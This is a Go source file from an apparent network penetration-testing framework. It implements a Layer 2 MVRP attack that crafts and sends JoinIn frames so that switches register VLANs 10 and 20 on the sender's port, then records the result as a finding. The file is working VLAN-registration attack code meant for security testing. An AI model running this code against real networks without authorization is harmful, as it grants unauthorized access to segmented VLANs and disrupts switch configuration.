// mvrp.go implements the MVRP (Multiple VLAN Registration Protocol) attack.
// It floods MVRP JoinIn messages for a set of VLANs, causing switches to
// register VLANs on the attacker's port. Classified transient-decay: MRP
// timers expire in minutes.
//
// This is a flood-class behavior: it uses the sync.Pool craft path
// for pre-serialized MVRP buffers.

package l2

import (
	"context"
	"encoding/json"
	"fmt"

	"go.aledante.io/FlowSeer/src/edge/netpen/layers"
	"go.aledante.io/FlowSeer/src/edge/netpen/runner"
)

type mvrpFinding struct {
	Action string   `json:"action"`
	VLANs  []uint16 `json:"vlans"`
	Count  int      `json:"count"`
	Event  string   `json:"event"`
}

// RunMVRP sends MVRP JoinIn messages for a set of VLANs. The burst is
// bounded for the in-memory test shape.
func RunMVRP(ctx context.Context, deps runner.Deps) error {
	src := srcMAC(deps)

	vlans := []uint16{10, 20}

	for _, vid := range vlans {
		mvrp := &layers.MVRP{
			Version: 0,
			Messages: []layers.MVRPMessage{
				{
					AttributeType: layers.MVRPAttrTypeVID,
					AttributeLen:  4,
					NumValues:     1,
					FirstValue:    vid,
					Events:        []layers.MVRPEvent{layers.MVRPEventJoinIn},
				},
			},
		}
		pkt, err := craftEtherType(mvrpDstMAC, src, ethertypeMVRP, mvrp)
		if err != nil {
			return fmt.Errorf("mvrp: craft frame for VLAN %d: %w", vid, err)
		}
		if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
			return fmt.Errorf("mvrp: send for VLAN %d: %w", vid, err)
		}
	}

	detail, _ := json.Marshal(mvrpFinding{
		Action: "mvrp-vlan-registration-flood",
		VLANs:  vlans,
		Count:  len(vlans),
		Event:  "JoinIn",
	})
	deps.Emitter.Finding("mvrp", detail)

	return nil
}
